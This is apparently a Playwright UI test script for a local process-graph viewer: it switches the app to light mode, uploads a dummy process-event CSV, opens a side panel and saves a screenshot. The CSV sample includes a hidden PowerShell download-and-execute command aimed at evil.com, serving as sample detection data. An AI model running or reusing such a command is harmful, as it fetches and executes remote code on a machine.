const { chromium } = require('playwright');
const path = require('path');
const fs = require('fs');

(async () => {
  const browser = await chromium.launch({ headless: true });
  const context = await browser.newContext();
  const page = await context.newPage();

  // Load the page
  await page.goto('http://localhost:5173');

  // Wait for React to mount and render
  await page.waitForTimeout(2000);

  // Switch to light mode by clicking the theme toggle
  // Assuming we have a theme toggle in Layout.jsx (from previous context, we might have to just set localStorage)
  await page.evaluate(() => {
    localStorage.setItem('theme', 'light');
    window.location.reload();
  });
  await page.waitForTimeout(2000);

  // Create a dummy CSV for upload to trigger graph
  const csvContent = `timestamp,process_id,parent_process_id,process_name,action,command_line
2023-10-01T10:00:00Z,1001,1000,svchost.exe,ProcessCreate,"svchost.exe -k netsvcs"
2023-10-01T10:01:00Z,1002,1001,cmd.exe,ProcessCreate,"cmd.exe /c whoami"
2023-10-01T10:02:00Z,1003,1002,powershell.exe,ProcessCreate,"powershell.exe -w hidden -c 'IEX (New-Object Net.WebClient).DownloadString(\"http://evil.com/payload\")'"`;

  const tempCsvPath = path.join(__dirname, 'test_theme.csv');
  fs.writeFileSync(tempCsvPath, csvContent);

  // Find the file input and upload
  const fileInput = await page.$('input[type=file]');
  if (fileInput) {
      await fileInput.setInputFiles(tempCsvPath);
      console.log('File uploaded');
  } else {
      console.log('File input not found');
  }

  // Wait for Graph to load
  await page.waitForTimeout(3000);

  // Click on a node in cytoscape canvas to open RightPanel
  // Try to dispatch a click event in the center of the graph
  const boundingBox = await page.locator('canvas').first().boundingBox();
  if (boundingBox) {
    await page.mouse.click(boundingBox.x + boundingBox.width / 2, boundingBox.y + boundingBox.height / 2);
    console.log('Clicked center of canvas to try to open right panel');
    await page.waitForTimeout(1000);
  }

  // Try to type in the right panel search filter
  const rightPanelSearch = await page.locator('input[placeholder="Filter node events..."]');
  if (await rightPanelSearch.isVisible()) {
      await rightPanelSearch.fill('powershell');
      console.log('Filled right panel search');
  } else {
      console.log('Right panel search not visible, it might not have opened from the blind click.');
  }

  await page.waitForTimeout(1000);

  // Take screenshot
  await page.screenshot({ path: 'right-panel-light-mode.png', fullPage: true });
  console.log('Screenshot saved to right-panel-light-mode.png');

  await browser.close();
})();
